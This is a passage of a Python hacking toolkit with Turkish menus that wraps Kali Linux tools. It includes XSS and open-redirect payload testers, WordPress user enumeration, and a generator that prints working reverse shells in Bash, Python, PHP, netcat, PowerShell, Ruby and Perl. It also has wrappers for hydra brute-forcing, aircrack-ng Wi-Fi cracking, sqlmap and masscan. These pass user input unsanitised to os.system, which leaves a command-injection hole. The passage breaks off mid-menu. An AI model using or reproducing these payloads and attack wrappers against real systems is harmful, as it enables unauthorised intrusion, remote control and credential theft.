        "\"><script>alert('XSS')</script>",
        "'><script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "\"><img src=x onerror=alert('XSS')>",
    ]
    
    print(f"{Fore.CYAN}[*] {len(payloads)} payload test ediliyor...")
    for payload in payloads:
        try:
            # URL'yi parse et ve parametreyi değiştir
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)
            if not qs:
                continue
            
            # İlk parametreyi payload ile değiştir
            first_param = list(qs.keys())[0]
            new_qs = urllib.parse.urlencode({k: (payload if k == first_param else v[0]) for k, v in qs.items()}, doseq=False)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
            
            r = requests.get(test_url, timeout=10)
            if payload in r.text:
                print(f"\n{Fore.RED}{'='*50}")
                print(f"{Fore.RED}[🚨] REFLECTED XSS TESPİT EDİLDİ!")
                print(f"{Fore.RED}    Parametre: {first_param}")
                print(f"{Fore.RED}    Payload: {payload}")
                print(f"{Fore.RED}{'='*50}")
                return
            print(f"{Fore.GREEN}[+] Test edildi: {payload[:30]}... | Temiz")
        except Exception as e:
            print(f"{Fore.RED}[-] Hata: {e}")
    
    print(f"\n{Fore.YELLOW}[*] Test tamamlandı. Reflected XSS bulunamadı.")

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 21: REVERSE IP LOOKUP
# ═══════════════════════════════════════════════════════════════════

def reverse_ip_lookup():
    print(f"\n{Fore.YELLOW}[*] Reverse IP Lookup")
    ip = input(f"{Fore.GREEN}IP Adresi: ").strip()
    if not ip:
        return
    
    try:
        req = urllib.request.Request(f"https://api.hackertarget.com/reverseiplookup/?q={ip}", headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=15) as resp:
            data = resp.read().decode('utf-8', errors='ignore')
            if "No DNS" in data or "error" in data.lower():
                print(f"{Fore.RED}[-] Sonuç bulunamadı.")
            else:
                domains = [d.strip() for d in data.split('\n') if d.strip()]
                print(f"\n{Fore.GREEN}[+] {len(domains)} domain bulundu:")
                for d in domains[:20]:
                    print(f"  {Fore.WHITE}{d}")
                if len(domains) > 20:
                    print(f"  {Fore.CYAN}... ve {len(domains)-20} adet daha")
    except Exception as e:
        print(f"{Fore.RED}[-] Hata: {e}")

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 22: MAC ADRES ÜRETİCİ / LOOKUP
# ═══════════════════════════════════════════════════════════════════

def mac_tool():
    print(f"\n{Fore.YELLOW}[*] MAC Adres Aracı")
    print("1 - Rastgele MAC Üret")
    print("2 - MAC Vendor Lookup")
    secim = input(f"{Fore.GREEN}Seçim: ").strip()
    
    if secim == "1":
        mac = ":".join([f"{random.randint(0,255):02x}" for _ in range(6)])
        print(f"{Fore.GREEN}[+] Rastgele MAC: {mac.upper()}")
    elif secim == "2":
        mac = input(f"{Fore.GREEN}MAC (örn: 00:50:56): ").strip()
        if not mac:
            return
        oui = mac.replace(":", "").replace("-", "").replace(".", "")[:6].upper()
        vendors = {
            "005056": "VMware", "080027": "VirtualBox", "001B11": "Intel",
            "001F3F": "Intel", "0026C7": "Intel", "00166F": "Apple",
            "00236C": "Apple", "A4B197": "Apple", "001B63": "Apple",
            "001E65": "Apple", "0021E9": "Apple", "001F5B": "Apple",
            "002500": "Apple", "0026BB": "Apple", "0016CB": "Apple",
            "001451": "Cisco", "0016C7": "Cisco", "001B0C": "Cisco",
            "001DA2": "Cisco", "001E14": "Cisco", "0021A0": "Cisco",
            "0019E8": "TP-Link", "001D0F": "TP-Link", "64E833": "TP-Link",
            "C0A0BB": "TP-Link", "F4EC38": "TP-Link", "001F1F": "TP-Link",
            "A0F3C1": "TP-Link", "001B11": "TP-Link",
        }
        vendor = vendors.get(oui, "Bilinmiyor")
        print(f"{Fore.GREEN}[+] Vendor: {vendor} (OUI: {oui})")
    else:
        print(f"{Fore.RED}[-] Geçersiz seçim!")

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 23: OPEN REDIRECT TESTER
# ═══════════════════════════════════════════════════════════════════

def open_redirect_tester():
    print(f"\n{Fore.YELLOW}[*] Open Redirect Zafiyet Testi")
    url = input(f"{Fore.GREEN}Hedef URL (redirect parametreli): ").strip()
    if not url:
        return
    
    payloads = ["https://evil.com", "//evil.com", "/\\evil.com", "http://evil.com"]
    print(f"{Fore.CYAN}[*] Test ediliyor...")
    
    for payload in payloads:
        try:
            test_url = url.replace("TARGET", payload) if "TARGET" in url else f"{url}{payload}"
            r = requests.get(test_url, timeout=10, allow_redirects=False)
            if r.status_code in [301, 302, 307, 308]:
                loc = r.headers.get('Location', '')
                if 'evil.com' in loc or payload in loc:
                    print(f"{Fore.RED}[🚨] OPEN REDIRECT! Payload: {payload}")
                    print(f"    Location: {loc}")
                    return
            print(f"{Fore.GREEN}[+] {payload} | Güvenli")
        except Exception as e:
            print(f"{Fore.RED}[-] Hata: {e}")

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 24: CSRF TOKEN KONTROL
# ═══════════════════════════════════════════════════════════════════

def csrf_checker():
    print(f"\n{Fore.YELLOW}[*] CSRF Token Kontrolü")
    url = input(f"{Fore.GREEN}Form URL: ").strip()
    if not url:
        return
    
    try:
        r = requests.get(url, timeout=10)
        tokens = ['csrf', 'xsrf', '_token', 'authenticity_token', 'csrf_token']
        found = []
        for token in tokens:
            if token in r.text.lower():
                found.append(token)
        
        if found:
            print(f"{Fore.GREEN}[+] CSRF token bulundu: {', '.join(found)}")
        else:
            print(f"{Fore.RED}[⚠] CSRF token BULUNAMADI! Form savunmasız olabilir.")
    except Exception as e:
        print(f"{Fore.RED}[-] Hata: {e}")

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 25: WORDPRESS TESPİT & ENUM
# ═══════════════════════════════════════════════════════════════════

def wordpress_enum():
    print(f"\n{Fore.YELLOW}[*] WordPress Tespit & Enum")
    url = input(f"{Fore.GREEN}Site URL: ").strip().rstrip('/')
    if not url:
        return
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    wp_signs = ['/wp-login.php', '/wp-admin/', '/wp-content/', '/wp-includes/', '/xmlrpc.php']
    is_wp = False
    
    print(f"{Fore.CYAN}[*] WordPress imzaları kontrol ediliyor...")
    for sign in wp_signs:
        try:
            r = requests.get(f"{url}{sign}", timeout=10, allow_redirects=False)
            if r.status_code in [200, 301, 302, 403]:
                print(f"{Fore.GREEN}[+] WP İmzası: {sign} ({r.status_code})")
                is_wp = True
        except:
            pass
    
    if not is_wp:
        print(f"{Fore.RED}[-] WordPress tespit edilemedi.")
        return
    
    # Kullanıcı enum
    print(f"\n{Fore.CYAN}[*] Kullanıcı enum deneniyor...")
    for i in range(1, 6):
        try:
            r = requests.get(f"{url}/wp-json/wp/v2/users/{i}", timeout=10)
            if r.status_code == 200:
                data = r.json()
                print(f"{Fore.GREEN}[+] Kullanıcı: {data.get('name')} | ID: {data.get('id')}")
        except:
            pass

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 26: SHELL REVERSE GENERATOR
# ═══════════════════════════════════════════════════════════════════

def reverse_shell_generator():
    print(f"\n{Fore.YELLOW}[*] Reverse Shell Payload Generator")
    ip = input(f"{Fore.GREEN}LHOST (Senin IP'n): ").strip()
    port = input(f"{Fore.GREEN}LPORT [4444]: ").strip() or "4444"
    
    if not ip:
        print(f"{Fore.RED}[-] IP gerekli!"); return
    
    shells = {
        "Bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "Python": f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'",
        "PHP": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "Netcat": f"nc -e /bin/sh {ip} {port}",
        "PowerShell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
        "Ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "Perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
    }
    
    print(f"\n{Fore.GREEN}[+] Reverse Shell Payloads:")
    for name, payload in shells.items():
        print(f"\n{Fore.CYAN}--- {name} ---")
        print(f"{Fore.WHITE}{payload}")

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 27: CİDAR HESAPLAYICI
# ═══════════════════════════════════════════════════════════════════

def cidr_calculator():
    print(f"\n{Fore.YELLOW}[*] CIDR / Subnet Hesaplayıcı")
    cidr = input(f"{Fore.GREEN}CIDR (örn: 192.168.1.0/24): ").strip()
    if not cidr:
        return
    
    try:
        net = ipaddress.ip_network(cidr, strict=False)
        print(f"\n{Fore.GREEN}[+] Sonuçlar:")
        print(f"  Ağ Adresi    : {net.network_address}")
        print(f"  Broadcast    : {net.broadcast_address}")
        print(f"  Host Sayısı  : {net.num_addresses - 2 if net.num_addresses > 2 else net.num_addresses}")
        print(f"  İlk Host     : {list(net.hosts())[0] if net.num_addresses > 2 else 'N/A'}")
        print(f"  Son Host     : {list(net.hosts())[-1] if net.num_addresses > 2 else 'N/A'}")
        print(f"  Netmask      : {net.netmask}")
        print(f"  Wildcard     : {net.hostmask}")
        print(f"  Özel Ağ      : {'Evet' if net.is_private else 'Hayır'}")
    except Exception as e:
        print(f"{Fore.RED}[-] Hata: {e}")

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 28: METADATA ÇIKARICI
# ═══════════════════════════════════════════════════════════════════

def metadata_extractor():
    print(f"\n{Fore.YELLOW}[*] Dosya Metadata Çıkarıcı")
    path = input(f"{Fore.GREEN}Dosya yolu: ").strip()
    if not path or not os.path.exists(path):
        print(f"{Fore.RED}[-] Dosya bulunamadı!"); return
    
    try:
        stat = os.stat(path)
        print(f"\n{Fore.GREEN}[+] Dosya Bilgileri:")
        print(f"  Dosya Adı    : {os.path.basename(path)}")
        print(f"  Boyut        : {stat.st_size} bytes")
        print(f"  Oluşturulma  : {datetime.fromtimestamp(stat.st_ctime)}")
        print(f"  Değiştirilme : {datetime.fromtimestamp(stat.st_mtime)}")
        print(f"  Erişim       : {datetime.fromtimestamp(stat.st_atime)}")
        print(f"  Tam Yol      : {os.path.abspath(path)}")
    except Exception as e:
        print(f"{Fore.RED}[-] Hata: {e}")

# ═══════════════════════════════════════════════════════════════════
#         HARİCİ ARAÇ ENTEGRASYONLARI (KALI LINUX)
# ═══════════════════════════════════════════════════════════════════

def nmap_run():
    def run():
        hedef = input(f"{Fore.GREEN}Taranacak IP/Domain: ").strip()
        if hedef:
            os.system(f"nmap -sV -O --top-ports 100 {hedef}")
        else:
            print(f"{Fore.RED}[-] Hedef boş!")
    run_tool("nmap", "nmap", "Nmap", run)

def sqlmap_run():
    def run():
        url = input(f"{Fore.GREEN}Test URL: ").strip()
        if url:
            os.system(f"sqlmap -u '{url}' --batch --dbs --random-agent")
        else:
            print(f"{Fore.RED}[-] URL boş!")
    run_tool("sqlmap", "sqlmap", "Sqlmap", run)

def msfconsole_run():
    run_tool("msfconsole", "metasploit-framework", "Metasploit")

def gobuster_run():
    def run():
        url = input(f"{Fore.GREEN}Hedef URL: ").strip()
        wordlist = input(f"{Fore.GREEN}Wordlist [/usr/share/wordlists/dirb/common.txt]: ").strip() or "/usr/share/wordlists/dirb/common.txt"
        if url:
            os.system(f"gobuster dir -u {url} -w {wordlist}")
        else:
            print(f"{Fore.RED}[-] URL boş!")
    run_tool("gobuster", "gobuster", "Gobuster", run)

def nikto_run():
    def run():
        url = input(f"{Fore.GREEN}Hedef URL: ").strip()
        if url:
            os.system(f"nikto -h {url}")
        else:
            print(f"{Fore.RED}[-] URL boş!")
    run_tool("nikto", "nikto", "Nikto", run)

def wpscan_run():
    def run():
        url = input(f"{Fore.GREEN}WordPress URL: ").strip()
        if url:
            os.system(f"wpscan --url {url} --enumerate u,vp,vt")
        else:
            print(f"{Fore.RED}[-] URL boş!")
    run_tool("wpscan", "wpscan", "WPScan", run)

def dirb_run():
    def run():
        url = input(f"{Fore.GREEN}Hedef URL: ").strip()
        if url:
            os.system(f"dirb {url}")
        else:
            print(f"{Fore.RED}[-] URL boş!")
    run_tool("dirb", "dirb", "Dirb", run)

def masscan_run():
    def run():
        ip = input(f"{Fore.GREEN}Hedef IP/Range: ").strip()
        if ip:
            os.system(f"sudo masscan {ip} -p1-65535 --rate=1000")
        else:
            print(f"{Fore.RED}[-] Hedef boş!")
    run_tool("masscan", "masscan", "Masscan", run)

def theharvester_run():
    def run():
        domain = input(f"{Fore.GREEN}Domain: ").strip()
        if domain:
            os.system(f"theHarvester -d {domain} -b all")
        else:
            print(f"{Fore.RED}[-] Domain boş!")
    run_tool("theharvester", "theharvester", "TheHarvester", run)

def john_run():
    def run():
        hashfile = input(f"{Fore.GREEN}Hash dosyası: ").strip()
        if hashfile and os.path.exists(hashfile):
            os.system(f"john {hashfile}")
        else:
            print(f"{Fore.RED}[-] Dosya bulunamadı!")
    run_tool("john", "john", "John the Ripper", run)

def hydra_run():
    def run():
        print(f"{Fore.YELLOW}[!] Hydra kullanım örneği gösteriliyor...")
        print(f"{Fore.WHITE}  ssh:    hydra -l admin -P wordlist.txt ssh://target")
        print(f"{Fore.WHITE}  ftp:    hydra -l admin -P wordlist.txt ftp://target")
        print(f"{Fore.WHITE}  web:    hydra -l admin -P wordlist.txt target http-post-form '/login.php:username=^USER^&password=^PASS^:F=invalid'")
        target = input(f"{Fore.GREEN}Hedef: ").strip()
        user = input(f"{Fore.GREEN}Kullanıcı: ").strip()
        wordlist = input(f"{Fore.GREEN}Wordlist: ").strip()
        proto = input(f"{Fore.GREEN}Protokol [ssh]: ").strip() or "ssh"
        if all([target, user, wordlist]):
            os.system(f"hydra -l {user} -P {wordlist} {proto}://{target}")
        else:
            print(f"{Fore.RED}[-] Eksik bilgi!")
    run_tool("hydra", "hydra", "Hydra", run)

def aircrack_run():
    def run():
        print(f"{Fore.YELLOW}[!] Aircrack-ng komutları:")
        print(f"{Fore.WHITE}  1. Arayüzü monitör moduna al: airmon-ng start wlan0")
        print(f"{Fore.WHITE}  2. Ağları tara:               airodump-ng wlan0mon")
        print(f"{Fore.WHITE}  3. Hedefi yakala:               airodump-ng -c [CH] -w capture --bssid [MAC] wlan0mon")
        print(f"{Fore.WHITE}  4. Kır:                         aircrack-ng capture-01.cap -w wordlist.txt")
        q = input(f"{Fore.GREEN}Aircrack-ng başlatılsın mı? (e/h): ").lower()
        if q == "e":
            os.system("aircrack-ng --help")
    run_tool("aircrack-ng", "aircrack-ng", "Aircrack-ng", run)

def tshark_run():
    def run():
        iface = input(f"{Fore.GREEN}Arayüz [eth0]: ").strip() or "eth0"
        os.system(f"sudo tshark -i {iface} -c 100")
    run_tool("tshark", "tshark", "Tshark (Wireshark CLI)", run)

def netcat_run():
    def run():
        print(f"{Fore.YELLOW}[!] Netcat kullanım modları:")
        print("1 - Dinleme modu (Listener)")
        print("2 - Bağlantı modu (Client)")
        print("3 - Dosya transferi (Al)")
        print("4 - Banner grabbing")
        mod = input(f"{Fore.GREEN}Seçim: ").strip()
        if mod == "1":
            port = input(f"{Fore.GREEN}Port: ").strip()
            os.system(f"nc -lvnp {port}")
        elif mod == "2":
            hedef = input(f"{Fore.GREEN}Hedef IP: ").strip()
            port = input(f"{Fore.GREEN}Port: ").strip()
            os.system(f"nc {hedef} {port}")
        elif mod == "3":
            port = input(f"{Fore.GREEN}Port: ").strip()
            os.system(f"nc -l -p {port} > received_file")
        elif mod == "4":
            hedef = input(f"{Fore.GREEN}Hedef IP: ").strip()
            port = input(f"{Fore.GREEN}Port: ").strip()
            os.system(f"echo '' | nc -v -w 2 {hedef} {port}")
        else:
            os.system("nc -h")
    run_tool("nc", "netcat", "Netcat", run)

def reconng_run():
    run_tool("recon-ng", "recon-ng", "Recon-ng")

def setoolkit_run():
    run_tool("setoolkit", "set", "Social-Engineer Toolkit (SET)")

def burpsuite_run():
    run_tool("burpsuite", "burpsuite", "Burp Suite")

# ═══════════════════════════════════════════════════════════════════
#                       ANA MENÜ SİSTEMİ
# ═══════════════════════════════════════════════════════════════════

def main():
    while True:
        banner()
        print(f"{Fore.MAGENTA}╔══════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.MAGENTA}║           {Fore.CYAN}BİLGİ TOPLAMA & KEŞİF (RECONNAISSANCE){Fore.MAGENTA}              ║")
        print(f"{Fore.MAGENTA}╠══════════════════════════════════════════════════════════════════╣")
        print(f"{Fore.WHITE}  1  {Fore.YELLOW}- TCP Port Zafiyet Analizörü")
        print(f"{Fore.WHITE}  2  {Fore.YELLOW}- IP Coğrafi Konum Çözücü")
        print(f"{Fore.WHITE}  3  {Fore.YELLOW}- WHOIS Domain Sorgulama")
        print(f"{Fore.WHITE}  4  {Fore.YELLOW}- DNS Enumeration")
        print(f"{Fore.WHITE}  5  {Fore.YELLOW}- Subdomain Scanner")
        print(f"{Fore.WHITE}  6  {Fore.YELLOW}- Web Dizin Brute-Force")
        print(f"{Fore.WHITE}  7  {Fore.YELLOW}- HTTP Header Analizörü")
        print(f"{Fore.WHITE}  8  {Fore.YELLOW}- SSL/TLS Sertifika Kontrolü")
        print(f"{Fore.WHITE}  9  {Fore.YELLOW}- Banner Grabbing")
        print(f"{Fore.WHITE}  10 {Fore.YELLOW}- Reverse IP Lookup")
        print(f"{Fore.WHITE}  11 {Fore.YELLOW}- E-posta MX Kontrol")
        print(f"{Fore.WHITE}  12 {Fore.YELLOW}- Telefon Numarası OSINT")
        print(f"{Fore.WHITE}  13 {Fore.YELLOW}- Yerel Ağ Tarama (Ping Sweep)")
        print(f"{Fore.WHITE}  14 {Fore.YELLOW}- CIDR / Subnet Hesaplayıcı")
        print(f"{Fore.WHITE}  15 {Fore.YELLOW}- robots.txt & Sitemap Tarayıcı")
        print(f"{Fore.MAGENTA}╠══════════════════════════════════════════════════════════════════╣")
        print(f"{Fore.MAGENTA}║              {Fore.CYAN}SALDIRI & ZAFİYET TESTLERİ (OFFENSIVE){Fore.MAGENTA}             ║")
        print(f"{Fore.MAGENTA}╠══════════════════════════════════════════════════════════════════╣")
        print(f"{Fore.WHITE}  16 {Fore.RED}- Redray Web Brute-Force Motoru")
        print(f"{Fore.WHITE}  17 {Fore.RED}- SQL Injection Hata Tarayıcı")
        print(f"{Fore.WHITE}  18 {Fore.RED}- Reflected XSS Tester")
        print(f"{Fore.WHITE}  19 {Fore.RED}- Open Redirect Tester")
        print(f"{Fore.WHITE}  20 {Fore.RED}- CSRF Token Kontrolü")
        print(f"{Fore.WHITE}
